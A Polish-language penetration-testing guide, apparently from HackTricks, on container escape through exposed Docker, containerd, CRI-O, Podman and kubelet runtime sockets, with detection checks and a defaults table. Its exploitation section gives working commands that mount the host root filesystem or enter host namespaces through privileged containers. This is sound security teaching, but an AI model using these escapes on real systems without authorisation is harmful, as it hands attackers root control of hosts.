# Runtime API i ekspozycja demona

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Wiele rzeczywistych kompromitacji kontenerów wcale nie zaczyna się od ucieczki z namespace. Zaczynają się od dostępu do runtime control plane. Jeśli workload może rozmawiać z `dockerd`, `containerd`, CRI-O, Podman, lub kubelet przez zamontowany Unix socket lub wystawiony TCP listener, atakujący może być w stanie zażądać nowego kontenera z wyższymi uprawnieniami, zamontować filesystem hosta, dołączyć do host namespaces lub pobrać wrażliwe informacje o nodzie. W takich przypadkach runtime API jest prawdziwą granicą bezpieczeństwa, a jego kompromitacja jest funkcjonalnie bliska kompromitacji hosta.

Dlatego ekspozycja runtime socket powinna być dokumentowana oddzielnie od zabezpieczeń jądra. Kontener z zwykłym seccomp, capabilities i MAC confinement może nadal być o jedno wywołanie API od kompromitacji hosta, jeśli `/var/run/docker.sock` lub `/run/containerd/containerd.sock` jest w nim zamontowany. Izolacja jądra bieżącego kontenera może działać dokładnie zgodnie z projektem, podczas gdy płaszczyzna zarządzania runtime pozostaje w pełni wystawiona.

## Modele dostępu do demona

Docker Engine tradycyjnie udostępnia swój uprzywilejowany API przez lokalny Unix socket pod adresem `unix:///var/run/docker.sock`. Historycznie był też wystawiany zdalnie przez TCP listeners takie jak `tcp://0.0.0.0:2375` lub TLS-protected listener na `2376`. Wystawienie demona zdalnie bez silnego TLS i uwierzytelniania klienta skutecznie zamienia Docker API w zdalny interfejs root.

containerd, CRI-O, Podman i kubelet udostępniają podobne powierzchnie o wysokim wpływie. Nazwy i workflowy się różnią, ale logika pozostaje ta sama. Jeśli interfejs pozwala wywołującemu tworzyć workloady, montować ścieżki hosta, pobierać poświadczenia lub modyfikować działające kontenery, to interfejs jest uprzywilejowanym kanałem zarządzania i powinien być traktowany odpowiednio.

Typowe lokalne ścieżki warte sprawdzenia to:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Starsze lub bardziej wyspecjalizowane stosy mogą również ujawniać punkty końcowe takie jak `dockershim.sock`, `frakti.sock`, lub `rktlet.sock`. Są one mniej powszechne we współczesnych środowiskach, ale gdy się z nimi zetkniemy, powinny być traktowane z taką samą ostrożnością, ponieważ reprezentują powierzchnie kontroli środowiska wykonawczego, a nie zwykłe gniazda aplikacji.

## Secure Remote Access

Jeżeli demon musi być wystawiony poza lokalne gniazdo, połączenie powinno być zabezpieczone przy użyciu TLS i najlepiej z wzajemnym uwierzytelnianiem, tak aby demon weryfikował klienta, a klient weryfikował demona. Stary zwyczaj otwierania demona Dockera przez zwykłe HTTP dla wygody jest jednym z najniebezpieczniejszych błędów w administracji kontenerami, ponieważ powierzchnia API jest na tyle silna, że umożliwia bezpośrednie tworzenie uprzywilejowanych kontenerów.

Historyczny wzorzec konfiguracji Dockera wyglądał następująco:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Na hostach opartych na systemd komunikacja procesu działającego jako daemon może także pojawić się jako `fd://`, co oznacza, że proces dziedziczy wstępnie otwarty socket od systemd zamiast samodzielnie go bindować. Ważna lekcja nie polega na dokładnej składni, lecz na konsekwencjach dla bezpieczeństwa. W chwili gdy daemon nasłuchuje poza ściśle uprawnionym lokalnym socketem, bezpieczeństwo transportu i uwierzytelnianie klienta stają się obowiązkowe, a nie opcjonalne środki hardeningu.

## Wykorzystanie

Jeśli obecny jest runtime socket, potwierdź który to, czy istnieje kompatybilny klient oraz czy możliwy jest surowy dostęp HTTP lub gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Te polecenia są przydatne, ponieważ rozróżniają pomiędzy martwą ścieżką, zmontowanym, ale niedostępnym socketem oraz aktywnym uprzywilejowanym API. Jeśli clientowi się powiedzie, kolejne pytanie brzmi, czy API może uruchomić nowy container z host bind mount lub host namespace sharing.

### Pełny przykład: Docker Socket To Host Root

Jeśli `docker.sock` jest osiągalny, klasyczną ucieczką jest uruchomienie nowego containera, który montuje root filesystem hosta, a następnie wejście do niego za pomocą `chroot`:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
To zapewnia bezpośrednie wykonanie jako root na hoście przez Docker daemon. Skutki nie ograniczają się do odczytu plików. Po wejściu do nowego kontenera atakujący może modyfikować pliki na hoście, pozyskiwać poświadczenia, wprowadzać mechanizmy utrzymywania dostępu lub uruchamiać dodatkowe uprzywilejowane obciążenia.

### Pełny przykład: Docker Socket To Host Namespaces

Jeśli atakujący woli wejście do przestrzeni nazw zamiast dostępu ograniczonego tylko do systemu plików:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ta ścieżka dociera do hosta, żądając od runtime utworzenia nowego kontenera z jawnym wystawieniem host-namespace, zamiast wykorzystywać bieżący.

### Pełny przykład: containerd Socket

Zamontowany `containerd` socket jest zwykle równie niebezpieczny:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Skutkiem jest ponowne przejęcie hosta. Nawet jeśli narzędzia specyficzne dla Docker są nieobecne, inny runtime API może nadal zapewniać te same uprawnienia administracyjne.

## Checks

Celem tych kontroli jest ustalenie, czy kontener może osiągnąć jakąkolwiek płaszczyznę zarządzania, która powinna pozostać poza granicą zaufania.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Co jest tu interesujące:

- Zamontowany runtime socket zazwyczaj stanowi bezpośrednią prymitywę administracyjną, a nie jedynie ujawnienie informacji.
- Nasłuch TCP na `2375` bez TLS należy traktować jako przesłankę zdalnej kompromitacji.
- Zmienne środowiskowe, takie jak `DOCKER_HOST`, często ujawniają, że workload został celowo zaprojektowany do komunikacji z host runtime.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie lokalny Unix socket | `dockerd` nasłuchuje na lokalnym socket i daemon zwykle działa jako root | montowanie `/var/run/docker.sock`, wystawianie `tcp://...:2375`, słaby lub brakujący TLS na `2376` |
| Podman | Domyślnie CLI bez daemona | Do zwykłego lokalnego użycia nie jest wymagany długotrwały uprzywilejowany daemon; sockety API mogą być jednak wystawione gdy `podman system service` jest włączony | wystawianie `podman.sock`, uruchamianie serwisu szeroko, użycie API z uprawnieniami roota |
| containerd | Lokalny uprzywilejowany socket | API administracyjne wystawione przez lokalny socket i zwykle wykorzystywane przez narzędzia wyższego poziomu | montowanie `containerd.sock`, szeroki dostęp `ctr` lub `nerdctl`, wystawianie uprzywilejowanych przestrzeni nazw |
| CRI-O | Lokalny uprzywilejowany socket | Endpoint CRI jest przeznaczony dla zaufanych komponentów lokalnych na węźle | montowanie `crio.sock`, wystawianie endpointu CRI na niezaufane workloady |
| Kubernetes kubelet | Lokalny na węźle interfejs zarządzania (API) | Kubelet nie powinien być szeroko dostępny z Podów; dostęp może ujawnić stan poda, poświadczenia i funkcje wykonywania w zależności od authn/authz | montowanie socketów kubelet lub certyfikatów, słaba autentykacja kubelet, host networking oraz osiągalny endpoint kubelet |
